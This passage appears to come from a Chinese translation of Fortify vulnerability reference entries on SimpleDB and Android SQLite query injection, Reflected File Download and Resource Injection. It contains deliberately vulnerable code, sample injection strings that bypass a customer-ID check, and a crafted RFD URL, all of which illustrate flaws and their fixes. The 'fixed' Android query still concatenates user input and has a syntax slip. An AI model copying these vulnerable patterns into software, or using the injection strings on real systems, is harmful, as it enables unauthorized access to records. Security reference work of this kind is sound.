<p>但是，由于这个查询是动态构造的，它由一个不变的基查询字符串和一个用户输入字符串连接而成，因此仅当 productCategory 和 price 不包含单引号字符时，才会正确执行这一查询。但是，如果攻击者为 productCategory 提供了字符串“Fax Machines’ or productCategory = \“”，并为 sortColumn 提供了字符串“\” order by ‘price”，则查询将变为如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from invoices</span><br><span class="line"></span><br><span class="line">where productCategory = &apos;Fax Machines&apos; or productCategory = &quot;&apos;</span><br><span class="line"></span><br><span class="line">and customerID = &apos;12345678&apos;</span><br><span class="line"></span><br><span class="line">order by &apos;&quot; order by &apos;price&apos; asc</span><br></pre></td></tr></table></figure>
<p>或者采用以下人类可读性更好的形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from invoices</span><br><span class="line"></span><br><span class="line">where productCategory = &apos;Fax Machines&apos;</span><br><span class="line"></span><br><span class="line">or productCategory = &quot;&apos; and customerID = &apos;12345678&apos; order by &apos;&quot;</span><br><span class="line"></span><br><span class="line">order by &apos;price&apos; asc</span><br></pre></td></tr></table></figure>
<p>这些输入使攻击者能够绕过 customerID 所要求的 Authentication，并查看与 ‘Fax Machines’ 相匹配的所有客户清单记录。</p>
<h5 id="RECOMMENDATIONS-309"><a href="#RECOMMENDATIONS-309" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>与大多数 SQL API 不同，Amazon Web Services SimpleDB 接口没有参数化选项。最佳解决方案是按照预定义的可接受值列表来验证所有的输入。如果这种方法不可行，可仅接受安全值白名单中的字符，或者识别并避免列在黑名单中的恶意数据。在这两个选项中，列白名单的方法在实施严格的输入验证规则方面更为有效。而对于通常采用的列黑名单的方法，由于总是存在一些小漏洞，所以并不能有效地防止 SimpleDB query injection 攻击。例如，攻击者可以：</p>
<p>— 把没有被黑名单引用的值作为目标</p>
<p>— 寻找方法以绕过对某一转义序列元字符的需要</p>
<p>— 使用存储过程来隐藏注入的元字符</p>
<p>如果可能，开发人员应维护允许值白名单，并在将用户输入添加到查询字符串之前进行逐一比较。如果不可行，例如对于表示名称或价格的字段，开发人员应至少根据白名单字符列表来验证输入。</p>
<p>手动转义查询字符串输入中的字符有一定的帮助，但是并不能完全保护您的应用程序免受 query injection 攻击。</p>
<p>REFERENCES</p>
<p>[1] Secure Use of Cloud Storage</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 89</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19)</p>
<h4 id="Query-String-Injection-Android-Provider"><a href="#Query-String-Injection-Android-Provider" class="headerlink" title="Query String Injection: Android Provider"></a>Query String Injection: Android Provider</h4><h5 id="ABSTRACT-310"><a href="#ABSTRACT-310" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>构建含有用户输入的 SQLite 查询指令会让攻击者能够查看未经授权的记录。</p>
<h5 id="EXPLANATION-311"><a href="#EXPLANATION-311" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Query string injection 漏洞会在以下情况下发生：</p>
<ol>
<li>数据从一个不可信赖的数据源进入程序。</li>
</ol>
<p>在这种情况下，Fortify Static Code Analyzer（Fortify 静态代码分析器）无法确定数据源是否可信赖。</p>
<ol>
<li>数据用于动态地构造一个 SQLite 查询。</li>
</ol>
<p>SQLite query string injection 允许恶意用户查看未经授权的记录，但不允许用户以任何方式更改数据库的状态。</p>
<p>例 1：以下代码动态地构造并执行了一个 SQLite 查询，该查询可搜索与客户和用户指定产品类别相关联的清单。用户还可以指定对结果进行排序的列。假定在执行此代码片段之前已正确验证了程序和设置了 customerID 的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">productCategory = this.getIntent().getExtras().getString(&quot;productCategory&quot;);</span><br><span class="line"></span><br><span class="line">sortColumn = this.getIntent().getExtras().getString(&quot;sortColumn&quot;);</span><br><span class="line"></span><br><span class="line">customerID = getAuthenticatedCustomerID(customerName, customerCredentials);</span><br><span class="line"></span><br><span class="line">c = invoicesDB.query(Uri.parse(invoices), columns, &quot;productCategory = &apos;&quot; + productCategory + &quot;&apos; and customerID = &apos;&quot; + customerID + &quot;&apos;&quot;, null, null, null, &quot;&apos;&quot; + sortColumn + &quot;&apos;asc&quot;, null);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这一代码所执行的查询如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from invoices</span><br><span class="line"></span><br><span class="line">where productCategory = &apos;Fax Machines&apos;</span><br><span class="line"></span><br><span class="line">and customerID = &apos;12345678&apos;</span><br><span class="line"></span><br><span class="line">order by &apos;price&apos; asc</span><br></pre></td></tr></table></figure>
<p>但是，这个查询是动态构造的，由一个常数基查询字符串和一个用户输入字符串 productCategory 连在一起形成。因此只有在 productCategory 与 sortColumn 不包含单引号字符时，这一查询才能正确执行。如果攻击者为 productCategory 提供了字符串“Fax Machines’ or productCategory = \“”，并为 sortColumn 提供了字符串“\” order by ‘price”，则查询将变为如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from invoices</span><br><span class="line"></span><br><span class="line">where productCategory = &apos;Fax Machines&apos; or productCategory = &quot;&apos;</span><br><span class="line"></span><br><span class="line">and customerID = &apos;12345678&apos;</span><br><span class="line"></span><br><span class="line">order by &apos;&quot; order by &apos;price&apos; asc</span><br></pre></td></tr></table></figure>
<p>或者采用以下可读性更好的形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from invoices</span><br><span class="line"></span><br><span class="line">where productCategory = &apos;Fax Machines&apos;</span><br><span class="line"></span><br><span class="line">or productCategory = &quot;&apos; and customerID = &apos;12345678&apos; order by &apos;&quot;</span><br><span class="line"></span><br><span class="line">order by &apos;price&apos; asc</span><br></pre></td></tr></table></figure>
<p>这些输入使攻击者能绕过 customerID 所要求的 authentication，并查看与 ‘Fax Machines’ 相匹配的所有客户清单记录。</p>
<h5 id="RECOMMENDATIONS-310"><a href="#RECOMMENDATIONS-310" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 query string injection 漏洞的根本原因在于攻击者可以改变查询的上下文，使程序员原本要作为数据解析的数值被篡改为命令了。当构造一个 SQLite 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，哪些仅仅是作为数据。参数化查询可以防止直接篡改上下文，避免 query string injection 攻击。当需要包含用户输入的数据时，请使用捆绑参数，这些捆绑参数是后续插入数据的占位符。换言之，捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会被解析成对该命令的修改。</p>
<p>SQLiteDatabase 类提供了使用 query() 方法执行参数化查询的功能。query() 方法会接受字符串数组，接着会将其捆绑至选择筛选器中由 ? 所定义的占位符，然后再执行查询。</p>
<p>例 2：以下代码中，将例 1 重写为使用参数化查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">productCategory = this.getIntent().getExtras().getString(&quot;productCategory&quot;);</span><br><span class="line"></span><br><span class="line">sortColumn = this.getIntent().getExtras().getString(&quot;sortColumn&quot;);</span><br><span class="line"></span><br><span class="line">customerID = getAuthenticatedCustomerID(customerName, customerCredentials);</span><br><span class="line"></span><br><span class="line">c = invoicesDB.query(Uri.parse(invoices), columns, &quot;productCategory = ? and customerID = ?&quot;, &#123;productCategory, customerID&#125;, null, null, &quot;&apos;&quot; sortColumn + &quot;&apos;asc&quot;, null);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>更加复杂的情况常常出现在报表生成代码中，因为这时需要通过用户输入来改变 SQL 指令的命令结构，比如在 WHERE 条件子句中加入动态的约束条件。不要因为这一需求，就无条件地接受连续的用户输入，从而创建查询语句字符串。当必须要根据用户输入来改变命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。</p>
<h5 id="REFERENCES-308"><a href="#REFERENCES-308" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Android Developers-Reference: SQLite Database</p>
<p>[2] SQL as Understood by SQLite</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 89</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19)</p>
<h4 id="Reflected-File-Download"><a href="#Reflected-File-Download" class="headerlink" title="Reflected File Download"></a>Reflected File Download</h4><h5 id="ABSTRACT-311"><a href="#ABSTRACT-311" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该应用程序允许攻击者创建一个 URL，该 URL 会强制下载似乎来自可信赖域的任意内容。</p>
<h5 id="EXPLANATION-312"><a href="#EXPLANATION-312" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>反射式文件下载 (RFD) 是一种允许攻击者创建钓鱼 URL 或页面的漏洞，一旦访问此类 URL 或页面将启动下载含有似乎来自可信赖域的任意内容的文件。由于用户信任该给定的域，他或她很可能会打开已下载的文件，从而导致执行恶意代码。</p>
<p>为使攻击者成功运行 RFD 攻击，需要满足以下要求：</p>
<ul>
<li><p>目标应用程序可在未经过适当验证或编码的情况下反映用户输入。这被用来注入负载。</p>
</li>
<li><p>目标应用程序允许打开宽松的 URL。因此，攻击者可以控制下载文件的名称和扩展名。</p>
</li>
<li><p>目标应用程序的 Content-Disposition 头文件配置错误，从而允许攻击者控制 HTTP 响应中的 Content-Type 和/或Content-Disposition 头文件，或者目标应用程序包含默认情况下不在浏览器中呈现的 Content-Type。</p>
</li>
</ul>
<p>例如，如果应用程序使用 Spring Web MVC ContentNegotiationManager 来动态生成不同的响应格式，则将满足进行 RFD 攻击的必要条件。</p>
<p>将 ContentNegotiationManager 配置为基于请求路径扩展名来确定响应格式，以及使用 Java 激活框架 (JAF) 找到可以更好地匹配客户端所请求格式的 Content-Type。它还允许客户端通过在请求的 Accept 头文件中发送的媒体类型指定响应内容类型。</p>
<p>示例 1：在下面的示例中，将应用程序配置为允许使用路径扩展名策略以及 Java 激活框架来确定响应的内容类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;contentNegotiationManager&quot; class=&quot;org.springframework.web.accept.ContentNegotiationManagerFactoryBean&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;favorPathExtension&quot; value=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;useJaf&quot; value=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<p>示例 2：在下面的示例中，将应用程序配置为允许使用请求的 Accept 头文件来确定响应的内容类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;contentNegotiationManager&quot; class=&quot;org.springframework.web.accept.ContentNegotiationManagerFactoryBean&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;ignoreAcceptHeader&quot; value=&quot;false&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<p>请注意，Spring 4.2.1 中的 ContentNegotiationManagerFactoryBean 属性默认值为：</p>
<ul>
<li><p>useJaf: true</p>
</li>
<li><p>favorPathExtension: true</p>
</li>
<li><p>ignoreAcceptHeader: false</p>
</li>
</ul>
<p>示例 1 中所显示的配置允许攻击者创建一个恶意 URL，例如：</p>
<p><a href="http://server/some/resource/endpoint/foo.bat?input=payload" target="_blank" rel="noopener">http://server/some/resource/endpoint/foo.bat?input=payload</a></p>
<p>这样 ContentNegotiationManager 将使用 Java 激活框架（如果在类路径中找到 activation.jar）来尝试解析给定文件扩展名的媒体类型，并相应地设置响应的 ContentType 头文件。在此示例中，文件扩展名为 “bat”，导致生成 application/x-msdownload 的 Content-Type 头文件（尽管确切的 Content-Type 可能因服务器 OS 和 JAF 配置而异）。因此，一旦受害者访问该恶意 URL，其计算机将自动下载含有受攻击者控制的内容的“.bat”文件。如果接下来执行此文件，那么受害者的计算机将运行由攻击者的负载指定的任何命令。 RECOMMENDATIONS 为了防止受到反射式文件下载的攻击，应用程序必须遵循以下建议：</p>
<p>如果使用 Spring MVC ContentNegotiationManager：</p>
<ol>
<li><p>确定您应该使用的 Content-Type 策略并使之尽可能地简单。如果适合，请仅使用路径扩展名策略，并在应用程序客户端未使用参数或 Accept 头文件的相关选项时将它们禁用。</p>
</li>
<li><p>通过将 setUseJaf 设置为 false，可禁用 Java 激活框架 (JAF)。</p>
</li>
<li><p>使用应用程序知道如何恰当处理的所有媒体类型列表来设置 mediaTypes 属性。</p>
</li>
<li><p>设置 defaultMediaType，以便始终控制未知媒体类型响应的 Content-Type 头文件。</p>
</li>
<li><p>将 ignoreAcceptHeader 设置为 true 后，攻击者将无法强制执行响应的 Content-Type 头文件值。</p>
</li>
</ol>
<p>示例 3：以下示例演示了 Spring ContentNegotiationManagerFactoryBean 的安全配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;contentNegotiationManager&quot; class=&quot;org.springframework.web.accept.ContentNegotiationManagerFactoryBean&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;favorPathExtension&quot; value=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;favorParameter&quot; value=&quot;false&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;useJaf&quot; value=&quot;false&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;ignoreAcceptHeader&quot; value=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;ignoreUnknownPathExtensions&quot; value=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;mediaTypes&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;value&gt;</span><br><span class="line"></span><br><span class="line">    json=application/json</span><br><span class="line"></span><br><span class="line">    xml=application/xml</span><br><span class="line"></span><br><span class="line">    txt=text/plain</span><br><span class="line"></span><br><span class="line">    html=text/html</span><br><span class="line"></span><br><span class="line">    &lt;/value&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;property name=&quot;defaultContentType&quot; value=&quot;application/json&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<p>作为一般性建议：</p>
<ul>
<li><p>确保 URL 不宽松并且禁止将其他字符添加到 URL 中。</p>
</li>
<li><p>对任意用户输入执行严格的白名单验证后，再将其反映到 HTTP 响应中。</p>
</li>
<li><p>为将在其中显示的上下文对由用户控制的数据进行编码。</p>
</li>
<li><p>使用 Content-Disposition 头文件时，明确指定文件名和扩展名。</p>
</li>
<li><p>使用反 CSRF 标记。</p>
</li>
<li><p>从服务器可验证使用 API 的应该是客户端而不是浏览器的客户端获取一个自定义头文件。</p>
</li>
<li><p>使用 JSONP 时，请使用白名单来验证回调名称。</p>
</li>
<li><p>使用 X-Content-Type-Options: nosniff 响应头文件阻止浏览器尝试自动确定响应的 Content-Type。</p>
</li>
<li><p>将您的应用程序配置为禁用请求路径和矩阵参数（如果可能）。</p>
</li>
<li><p>创建受支持的 Content-Type 值列表并禁用用于反映 Accept 请求头文件的选项（如果可能）。</p>
</li>
</ul>
<h5 id="REFERENCES-309"><a href="#REFERENCES-309" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Oren Hafif Reflected File Download - A New Web Attack Vector</p>
<p>[2] Alvaro Munoz Reflected File Download in Spring MVC</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 20, CWE ID 79, CWE ID 233</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.6</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Resource-Injection"><a href="#Resource-Injection" class="headerlink" title="Resource Injection"></a>Resource Injection</h4><h5 id="ABSTRACT-312"><a href="#ABSTRACT-312" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用用户输入控制资源标识符，借此攻击者可以访问或修改其他受保护的系统资源。</p>
<h5 id="EXPLANATION-313"><a href="#EXPLANATION-313" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当满足以下两个条件时，就会发生 resource injection：</p>
<ol>
<li>攻击者可以指定已使用的标识符来访问系统资源。</li>
</ol>
<p>例如，攻击者可能可以指定用来连接到网络资源的端口号。</p>
<ol>
<li>攻击者可以通过指定特定资源来获取某种权限，而这种权限在一般情况下是不可能获得的。</li>
</ol>
<p>例如，程序可能会允许攻击者把敏感信息传输到第三方服务器。</p>
<p>注意：如果资源注入涉及存储在文件系统中的资源，则可以将其报告为名为路径篡改的不同类别。有关这一漏洞的详细信息，请参见 path manipulation 的描述。</p>
<p>示例 1：下面的代码使用读取自 HTTP 请求的端口号来建立一个套接字。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String remotePort = request.getParameter(&quot;remotePort&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ServerSocket srvr = new ServerSocket(remotePort);</span><br><span class="line"></span><br><span class="line">Socket skt = srvr.accept();</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 resource injection）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>示例 2：下面的代码使用读取自 Android Intent 的 URL 在 WebView 中加载页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	WebView webview = new WebView(this);</span><br><span class="line"></span><br><span class="line">	setContentView(webview);</span><br><span class="line"></span><br><span class="line">        String url = this.getIntent().getExtras().getString(&quot;url&quot;);</span><br><span class="line"></span><br><span class="line">	webview.loadUrl(url);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这种受用户输入影响的资源表明其中的内容可能存在危险。例如，包含如句点、斜杠和反斜杠等特殊字符的数据在与 file system 相作用的方法中使用时，具有很大风险。类似的，对于创建远程结点的函数来说，包含 URL 和 URI 的数据也具有很大风险。</p>
